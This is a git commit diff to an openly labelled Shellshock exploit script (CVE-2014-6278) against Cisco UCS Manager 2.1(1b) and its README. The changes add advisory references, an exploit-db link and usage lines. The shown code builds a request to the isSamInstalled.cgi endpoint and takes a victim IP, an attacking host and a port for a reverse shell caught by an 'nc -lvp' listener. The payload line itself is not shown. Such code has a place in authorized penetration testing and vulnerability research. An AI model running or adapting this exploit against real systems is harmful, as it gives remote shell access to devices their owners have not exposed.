06cc553f1b002ce097ac24a5bd27d266c17880a7
Chris Eckert <chris.eckert2@gmail.com>
2016-03-18 10:33:23 -0700

    Readme updated.

--- CiscoUCS_Shellshock.py
+++ CiscoUCS_Shellshock.py
@@ -2,12 +2,14 @@
 ###############################################
 # Cisco UCS Manager 2.1(1b) Shellshock Exploit
 # 
+# CVE-2014-6278
+# Confirmed on version 2.1(1b), but more are likely vulnerable.
+# Cisco's advisory: 
+# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash
 # Exploit generates a reverse shell to a nc listener.
-# Author: @thatchriseckert
+# Exploit Author: @thatchriseckert
 ###############################################
 
-import httplib
-import urllib
 import sys
 import requests
 import time
@@ -16,12 +18,13 @@ if len(sys.argv) < 4:
 	print "\n[*] Cisco UCS Manager 2.1(1b) Shellshock Exploit"
 	print "[*] Usage: <Victim IP> <Attacking Host> <Reverse Shell Port>" 
 	print "[*]"
-	print "[*] Example: 127.0.0.1 127.0.0.1 4444"
+	print "[*] Example: shellshock.py 127.0.0.1 127.0.0.1 4444"
 	print "[*] Listener: nc -lvp <port>"
 	print "\n"
 	sys.exit()
 
-requests.packages.urllib3.disable_warnings()
+#Disables request warning for cert validation ignore.
+requests.packages.urllib3.disable_warnings() 
 ucs = sys.argv[1]
 url = "https://" + ucs + "/ucsm/isSamInstalled.cgi"
 attackhost = sys.argv[2]
--- README.md
+++ README.md
@@ -6,3 +6,14 @@ Exploit generates a reverse shell to a nc listener.
 Exploit Author: @thatchriseckert
 
 Exploit goes after a specific cgi script in Cisco UCS manager to create a reverse shell back to the ip/port specified.
+
+Also posted on edb:  https://www.exploit-db.com/exploits/39568/
+
+Usage -
+
+[*] Usage: <Victim IP> <Attacking Host> <Reverse Shell Port>
+[*] Example: shellshock.py 127.0.0.1 127.0.0.1 4444
+[*] Listener: nc -lvp <port>
+
+
+
